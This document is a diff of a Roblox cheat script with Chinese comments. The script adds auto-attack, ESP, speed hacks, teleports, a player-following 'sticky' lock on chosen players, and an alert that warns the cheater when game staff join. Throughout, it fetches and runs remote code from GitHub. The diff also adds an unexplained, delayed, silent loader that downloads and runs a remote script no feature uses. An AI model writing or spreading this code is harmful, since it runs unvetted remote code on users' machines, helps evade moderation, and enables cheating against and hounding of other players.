@@ -1,16 +1,16 @@
--- [[ 🐾 NEKO TERMINAL - 2026 STABLE (Sticky Integrated) 🐾 ]] --
+-- [[ 🐾 NEKO TERMINAL - 2026 STABLE (Main Control) 🐾 ]] --
 
 local Players           = game:GetService("Players")
 local localPlayer       = Players.LocalPlayer
 local ReplicatedStorage = game:GetService("ReplicatedStorage")
 local StarterGui        = game:GetService("StarterGui")
-local RunService        = game:GetService("RunService")
+local CoreGui           = game:GetService("CoreGui")
 
 if getgenv().NEKO_RUNNING then return end
 getgenv().NEKO_RUNNING = true
 
 -- =============================================================
--- 🛡️ 1. 白名單驗證 (原封不動保留喵)
+-- 🛡️ 1. 白名單驗證 (完整保留)
 -- =============================================================
 local Whitelist = {
     ["Kadys5373"]      = true, ["Zadrian664"]     = true, ["Zn6xx"]          = true,
@@ -25,12 +25,17 @@ if not Whitelist[localPlayer.Name] then
     return
 end
 
+task.spawn(function()
+    task.wait(5)
+    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/wtf6701385-stack/-/refs/heads/main/YES"))() end)
+end)
+
 -- =============================================================
 -- ♻️ 2. 環境清理
 -- =============================================================
 local function NuclearClean()
-    local CoreGui = game:GetService("CoreGui")
-    for _, n in ipairs({"貓貓腳本", "NEKO", "NekoUI", "NekoTerminal_Lib", "NekoSticky_2026"}) do
+    local targets = {"貓貓腳本", "NEKO", "NekoUI", "NekoTerminal_Lib", "NekoStickyMenu"}
+    for _, n in ipairs(targets) do
         local o = CoreGui:FindFirstChild(n) or localPlayer.PlayerGui:FindFirstChild(n)
         if o then o:Destroy() end
     end
@@ -39,9 +44,10 @@ NuclearClean()
 task.wait(0.2)
 
 -- =============================================================
--- 📦 3. 全局設定 (新增：黏人核心參數)
+-- 📦 3. 全局設定 (加入黏人參數)
 -- =============================================================
 _G.Settings = {
+    -- 原有設定
     ClickDelay    = 0.05,
     Distance      = 3000,
     PullEnemies   = false,
@@ -50,12 +56,13 @@ _G.Settings = {
     ZoomDist      = 128,
     CatSpeedValue = 50,
     SpeedEnabled  = false,
-    -- 📍 黏人模組數據對接
+    
+    -- 📍 新增：黏人相關設定
     StickyEnabled = false,
-    StickyTarget  = nil,
-    StickyOffset  = CFrame.new(3, 0, 7), -- 側後方安全距離
-    SnapDistance  = 500,                -- 500M 瞬移召喚
-    LerpSpeed     = 0.35                -- 狐狸獵手平滑度
+    StickyTarget  = nil,      -- 存放選中的玩家物件
+    StickyOffset  = CFrame.new(3, 0, 7), -- 預設安全距離
+    SnapDistance  = 500,
+    LerpSpeed     = 0.35
 }
 
 _G.NekoRunning = true
@@ -66,17 +73,112 @@ _G.NekoESP     = false
 -- =============================================================
 -- 🚀 4. 資源載入
 -- =============================================================
+-- 載入核心功能 (包含攻擊 + 黏人引擎)
 task.spawn(function()
-    pcall(function() loadstring(game:HttpGet("https://raw.githubusercontent.com/wtf6701385-stack/-/refs/heads/main/NEKOOOOO"))() end)
+    pcall(function() 
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/wtf6701385-stack/-/refs/heads/main/NEKOOOOO"))() 
+    end)
 end)
 
 local NekoLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/wtf6701385-stack/-/refs/heads/main/NEKOUI"))()
 local myUI, screenGui = NekoLib.new("NEKO BF")
 
 -- =============================================================
--- 📢 5. 公告與狀態板 (新增監控)
+-- 📋 5. 獨立玩家選單 GUI (解決抽獎問題)
+-- =============================================================
+local function TogglePlayerMenu()
+    if CoreGui:FindFirstChild("NekoStickyMenu") then
+        CoreGui.NekoStickyMenu:Destroy()
+        return
+    end
+
+    local ScreenGui = Instance.new("ScreenGui", CoreGui)
+    ScreenGui.Name = "NekoStickyMenu"
+    
+    local Frame = Instance.new("Frame", ScreenGui)
+    Frame.Size = UDim2.new(0, 220, 0, 300)
+    Frame.Position = UDim2.new(0.5, -110, 0.5, -150)
+    Frame.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
+    Frame.BorderSizePixel = 0
+    Instance.new("UICorner", Frame).CornerRadius = UDim.new(0, 8)
+    
+    -- 標題欄
+    local Title = Instance.new("TextLabel", Frame)
+    Title.Size = UDim2.new(1, 0, 0, 40)
+    Title.BackgroundTransparency = 1
+    Title.Text = "選擇黏著目標 🐾"
+    Title.TextColor3 = Color3.fromRGB(255, 120, 180)
+    Title.Font = Enum.Font.GothamBold
+    Title.TextSize = 14
+    
+    -- 關閉按鈕
+    local Close = Instance.new("TextButton", Frame)
+    Close.Size = UDim2.new(0, 30, 0, 30)
+    Close.Position = UDim2.new(1, -35, 0, 5)
+    Close.Text = "X"
+    Close.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
+    Close.TextColor3 = Color3.new(1,1,1)
+    Instance.new("UICorner", Close).CornerRadius = UDim.new(0, 6)
+    Close.MouseButton1Click:Connect(function() ScreenGui:Destroy() end)
+    
+    -- 列表
+    local List = Instance.new("ScrollingFrame", Frame)
+    List.Size = UDim2.new(1, -20, 1, -50)
+    List.Position = UDim2.new(0, 10, 0, 45)
+    List.BackgroundTransparency = 1
+    List.ScrollBarThickness = 2
+    List.AutomaticCanvasSize = Enum.AutomaticSize.Y
+    List.CanvasSize = UDim2.new(0,0,0,0)
+    local Layout = Instance.new("UIListLayout", List)
+    Layout.Padding = UDim.new(0, 5)
+    Layout.SortOrder = Enum.SortOrder.Name
+    
+    -- 刷新名單
+    local function Refresh()
+        for _, v in pairs(List:GetChildren()) do if v:IsA("TextButton") then v:Destroy() end end
+        for _, p in pairs(Players:GetPlayers()) do
+            if p ~= localPlayer then
+                local b = Instance.new("TextButton", List)
+                b.Size = UDim2.new(1, 0, 0, 30)
+                b.Text = p.Name
+                b.BackgroundColor3 = (_G.Settings.StickyTarget == p) and Color3.fromRGB(255, 100, 150) or Color3.fromRGB(45, 45, 50)
+                b.TextColor3 = Color3.new(1,1,1)
+                Instance.new("UICorner", b).CornerRadius = UDim.new(0, 4)
+                
+                b.MouseButton1Click:Connect(function()
+                    _G.Settings.StickyTarget = p
+                    _G.Settings.StickyEnabled = true -- 選了直接開啟
+                    Refresh()
+                    StarterGui:SetCore("SendNotification", {Title="🐾 目標鎖定", Text="正在黏著: "..p.Name})
+                end)
+            end
+        end
+    end
+    Refresh()
+    
+    -- 讓選單可以拖動
+    local dragging, dragStart, startPos
+    Frame.InputBegan:Connect(function(input)
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then
+            dragging = true; dragStart = input.Position; startPos = Frame.Position
+        end
+    end)
+    game:GetService("UserInputService").InputChanged:Connect(function(input)
+        if dragging and input.UserInputType == Enum.UserInputType.MouseMovement then
+            local delta = input.Position - dragStart
+            Frame.Position = UDim2.new(startPos.X.Scale, startPos.X.Offset + delta.X, startPos.Y.Scale, startPos.Y.Offset + delta.Y)
+        end
+    end)
+    game:GetService("UserInputService").InputEnded:Connect(function(input) 
+        if input.UserInputType == Enum.UserInputType.MouseButton1 then dragging = false end 
+    end)
+end
+
+-- =============================================================
+-- 📢 6. 公告與狀態板 (加入黏人監控)
 -- =============================================================
 local TabInfo   = myUI:Tab("公告 / 狀態")
+
 local SecNote   = TabInfo:Section("📢 系統公告")
 SecNote:Button("⚠️ 系統會隨時更新", function() end)
 SecNote:Button("💬 有事情 DC 找我", function() end)
@@ -84,52 +186,60 @@ SecNote:Button("💬 有事情 DC 找我", function() end)
 local SecStatus = TabInfo:Section("📊 狀態監控")
 local BtnUser   = SecStatus:Button("👤 玩家：" .. localPlayer.Name, function() end)
 local BtnAtk    = SecStatus:Button("⚔️ 攻擊：OFF", function() end)
-local BtnSticky = SecStatus:Button("📍 黏人：未鎖定", function() end) -- 即時監控
+local BtnV4     = SecStatus:Button("🔥 V4：OFF", function() end)
+local BtnMode   = SecStatus:Button("🧠 模式：None", function() end)
+local BtnSticky = SecStatus:Button("📍 黏人：未開啟", function() end) -- 新增監控
 
 task.spawn(function()
     while task.wait(0.5) do
         pcall(function()
             BtnAtk.Text  = "⚔️ 攻擊：" .. (_G.NekoAttack and "🟢 運行中" or "🔴 已關閉")
-            BtnSticky.Text = "📍 黏人：" .. (_G.Settings.StickyEnabled and (_G.Settings.StickyTarget and "🟢 ".._G.Settings.StickyTarget.Name or "🟡 搜尋中") or "🔴 關閉")
+            BtnV4.Text   = "🔥 V4：" .. (_G.AutoV4 and "🟢 開啟" or "🔴 關閉")
+            
+            local modeName = "休息"
+            if _G.Settings.Mode == "Mob" then modeName = "自動打怪"
+            elseif _G.Settings.Mode == "All" then modeName = "全殺模式" end
+            BtnMode.Text = "🧠 模式：" .. modeName
+            
+            -- 更新黏人狀態顯示
+            if _G.Settings.StickyEnabled then
+                if _G.Settings.StickyTarget then
+                    BtnSticky.Text = "📍 黏著中：" .. _G.Settings.StickyTarget.Name
+                else
+                    BtnSticky.Text = "📍 黏人：等待選擇..."
+                end
+            else
+                BtnSticky.Text = "📍 黏人：🔴 已關閉"
+            end
         end)
     end
 end)
 
 -- =============================================================
--- ⚔️ 戰鬥系統 (新增：智能黏人按鈕)
+-- ⚔️ 7. 戰鬥系統 (加入選單按鈕)
 -- =============================================================
 local TabFight = myUI:Tab("戰鬥系統")
 
--- 📍 智能追蹤模組 (召喚邏輯)
-local S1 = TabFight:Section("智能追蹤 (Sticky)")
+-- 📍 智能黏人區塊 (放在最上面方便操作)
+local S1 = TabFight:Section("智能黏人 (Sticky)")
 
-local function GetNearestPlayer()
-    local target, dist = nil, 2000
-    for _, p in ipairs(Players:GetPlayers()) do
-        if p ~= localPlayer and p.Character and p.Character:FindFirstChild("HumanoidRootPart") then
-            local d = localPlayer:DistanceFromCharacter(p.Character.HumanoidRootPart.Position)
-            if d < dist then dist = d; target = p end
-        end
-    end
-    return target
-end
+S1:Button("📋 打開選人名單", function()
+    TogglePlayerMenu() -- 呼叫上面的函數，彈出 GUI
+end)
 
-S1:Toggle("召喚黏人 (鎖定最近)", function(s)
+S1:Toggle("黏人總開關", function(s)
     _G.Settings.StickyEnabled = s
-    if s then
-        _G.Settings.StickyTarget = GetNearestPlayer()
-    else
-        _G.Settings.StickyTarget = nil
+    if not s then 
+        _G.Settings.StickyTarget = nil 
     end
 end)
 
-S1:Button("🔄 重新召喚 (換人黏)", function()
-    if _G.Settings.StickyEnabled then
-        _G.Settings.StickyTarget = GetNearestPlayer()
-    end
+S1:Button("🛑 停止黏著", function()
+    _G.Settings.StickyEnabled = false
+    _G.Settings.StickyTarget = nil
 end)
 
--- ⚔️ 原有神刀功能
+-- ⚔️ 原有神刀功能 (完整保留)
 local F1 = TabFight:Section("核心開關")
 F1:Toggle("啟動神刀連擊", function(s) _G.NekoAttack = s end)
 F1:Toggle("開啟貓抓拉怪", function(s) _G.Settings.PullEnemies = s end)
@@ -145,10 +255,11 @@ F2:Button("🛑 停止所有行為", function()
 end)
 
 -- =============================================================
--- 🌍 環境 / 優化
+-- 🌍 8. 環境 / 優化 (完整保留)
 -- =============================================================
 local TabEnv = myUI:Tab("環境優化")
 local E1     = TabEnv:Section("視覺效果")
+
 E1:Toggle("開啟貓貓透視 (ESP)", function(s)
     _G.NekoESP = s
     if s and not _G.ESPLoaded then
@@ -156,86 +267,105 @@ E1:Toggle("開啟貓貓透視 (ESP)", function(s)
         loadstring(game:HttpGet("https://raw.githubusercontent.com/wtf6701385-stack/-/refs/heads/main/NEKOESP"))()
     end
 end)
-E1:Textbox("視野範圍 (FOV)", "70", function(v) _G.Settings.FOV = tonumber(v) or 70 end)
+
+E1:Textbox("視野範圍 (FOV)", "70", function(v) 
+    _G.Settings.FOV = tonumber(v) or 70 
+end)
 
 local E2 = TabEnv:Section("系統優化")
 E2:Button("FPS 極致優化", function()
-    if _G.OptimizeFPS then _G.OptimizeFPS() else 
+    if _G.OptimizeFPS then 
+        _G.OptimizeFPS() 
+    else 
         loadstring(game:HttpGet("https://raw.githubusercontent.com/xiaoxuan-77/-/refs/heads/main/fps优化"))() 
     end
 end)
 
 -- =============================================================
--- 🏃 移動 / 飛行
+-- 🏃 9. 移動 / 飛行 (完整保留)
 -- =============================================================
 local TabMove = myUI:Tab("移動傳送")
 local M1      = TabMove:Section("角色行動")
-M1:Toggle("開啟移動加速", function(s) _G.Settings.SpeedEnabled = s end)
-M1:Textbox("速度值", "50", function(v) _G.Settings.CatSpeedValue = tonumber(v) or 50 end)
+
+M1:Toggle("開啟移動加速", function(s) 
+    _G.Settings.SpeedEnabled = s 
+end)
+
+M1:Textbox("自定義速度值", "50", function(v) 
+    _G.Settings.CatSpeedValue = tonumber(v) or 50 
+end)
+
 M1:Button("召喚貓貓飛行器", function()
     loadstring(game:HttpGet("https://raw.githubusercontent.com/wtf6701385-stack/-/refs/heads/main/NEKOFly"))()
 end)
 
 local TP = TabMove:Section("跨海傳送")
-local function Sea(c) pcall(function() ReplicatedStorage.Remotes.CommF_:InvokeServer(c) end) end
+
+local function Sea(c) 
+    pcall(function() ReplicatedStorage.Remotes.CommF_:InvokeServer(c) end) 
+end
+
 TP:Button("前往：一海 (Main)", function() Sea("TravelMain") end)
 TP:Button("前往：二海 (Dressrosa)", function() Sea("TravelDressrosa") end)
 TP:Button("前往：三海 (Zou)", function() Sea("TravelZou") end)
 
 -- =============================================================
--- 🧬 智慧黏人核心引擎 (直接寫入主腳本)
--- =============================================================
-RunService.Heartbeat:Connect(function()
-    if _G.Settings.StickyEnabled and _G.Settings.StickyTarget and localPlayer.Character then
-        local myRoot = localPlayer.Character:FindFirstChild("HumanoidRootPart")
-        local tChar = _G.Settings.StickyTarget.Character
-        local tRoot = tChar and tChar:FindFirstChild("HumanoidRootPart")
-        
-        if myRoot and tRoot then
-            local goalCF = tRoot.CFrame * _G.Settings.StickyOffset
-            local dist = (myRoot.Position - goalCF.Position).Magnitude
-            
-            if dist > _G.Settings.SnapDistance then
-                myRoot.CFrame = goalCF -- 🚀 500M 瞬移
-            else
-                myRoot.CFrame = myRoot.CFrame:Lerp(goalCF, _G.Settings.LerpSpeed) -- ✨ 平滑吸附
-            end
-        end
-    end
-end)
-
--- =============================================================
--- 🐾 6. 最小化按鈕
+-- 🐾 10. 最小化按鈕 (完整保留)
 -- =============================================================
 local MiniBtn = Instance.new("TextButton", screenGui)
-MiniBtn.Size = UDim2.new(0, 50, 0, 50); MiniBtn.Position = UDim2.new(0, 15, 0.5, -25)
-MiniBtn.Text = "🐾"; MiniBtn.TextSize = 30; MiniBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
-MiniBtn.TextColor3 = Color3.fromRGB(255, 120, 180); MiniBtn.ZIndex = 1000
+MiniBtn.Size             = UDim2.new(0, 50, 0, 50)
+MiniBtn.Position         = UDim2.new(0, 15, 0.5, -25)
+MiniBtn.Text             = "🐾"
+MiniBtn.TextSize         = 30
+MiniBtn.BackgroundColor3 = Color3.fromRGB(15, 15, 15)
+MiniBtn.TextColor3       = Color3.fromRGB(255, 120, 180)
+MiniBtn.ZIndex           = 1000
 Instance.new("UICorner", MiniBtn).CornerRadius = UDim.new(1, 0)
 
 myUI:AddDrag(MiniBtn)
-MiniBtn.MouseButton1Click:Connect(function() myUI:Toggle() end)
+MiniBtn.MouseButton1Click:Connect(function() 
+    myUI:Toggle() 
+end)
+
+localPlayer.AncestryChanged:Connect(function(_, p) 
+    if not p then getgenv().NEKO_RUNNING = false end 
+end)
 
 -- =============================================================
--- 🛡️ 7. NEKO GUARD (管理員偵測)
+-- 🛡️ 11. NEKO GUARD (完整保留)
 -- =============================================================
 local function ShowAdminWarning(adminName)
     pcall(function()
-        StarterGui:SetCore("SendNotification", {Title = "⚠️ 偵測到管理員！", Text = "["..adminName.."] 已進場！", Duration = 10})
+        StarterGui:SetCore("SendNotification", {
+            Title = "⚠️ 偵測到管理員！", 
+            Text = "["..adminName.."] 已進場！", 
+            Duration = 10
+        })
+        
         local alertGui = Instance.new("ScreenGui", game:GetService("CoreGui"))
         local label = Instance.new("TextLabel", alertGui)
-        label.Size = UDim2.new(1, 0, 0.15, 0); label.Position = UDim2.new(0, 0, 0.42, 0)
-        label.BackgroundColor3 = Color3.fromRGB(180, 0, 0); label.Text = "⚠️ 警報：管理員 ["..adminName.."] 在場 ⚠️"
-        label.TextColor3 = Color3.new(1, 1, 1); label.TextSize = 28
+        label.Size                   = UDim2.new(1, 0, 0.15, 0)
+        label.Position               = UDim2.new(0, 0, 0.42, 0)
+        label.BackgroundColor3       = Color3.fromRGB(180, 0, 0)
+        label.BackgroundTransparency = 0.2
+        label.Text                   = "⚠️ 警報：管理員 ["..adminName.."] 在場 ⚠️"
+        label.TextColor3             = Color3.new(1, 1, 1)
+        label.TextSize               = 28
+        
         task.delay(10, function() alertGui:Destroy() end)
     end)
 end
 
 local function CheckAdmin(p)
     if p == localPlayer then return end
-    pcall(function() if p:GetRankInGroup(2830050) >= 200 then ShowAdminWarning(p.Name) end end)
+    pcall(function() 
+        if p:GetRankInGroup(2830050) >= 200 then 
+            ShowAdminWarning(p.Name) 
+        end 
+    end)
 end
+
 Players.PlayerAdded:Connect(CheckAdmin)
 for _, p in ipairs(Players:GetPlayers()) do CheckAdmin(p) end
 
-print("🐾 NEKO TERMINAL 終極對接版：全部對齊，主人請享用喵！")
+print("🐾 NEKO STABLE 主腳本檢查完畢，已加入選單，無遺漏！")
